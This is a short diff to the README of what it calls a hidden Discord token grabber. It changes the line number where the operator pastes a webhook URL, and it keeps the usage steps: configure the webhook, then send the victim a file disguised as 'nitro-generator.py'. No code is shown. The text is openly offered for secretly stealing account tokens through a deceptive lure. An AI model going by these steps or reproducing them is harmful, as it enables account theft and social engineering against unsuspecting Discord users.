@@ -19,7 +19,7 @@ A hidden token grabber that will allow you to secretly steal discord tokens.
 
 ## How to use
 
-1. Put your webhooks url in line 58<br>`URL = 'YOUR WEBHOOKS URL HERE'`
+1. Put your webhooks url in line 56<br>`URL = 'YOUR WEBHOOKS URL HERE'`
 
 2. Send your victim the `nitro-generator.py` file
 
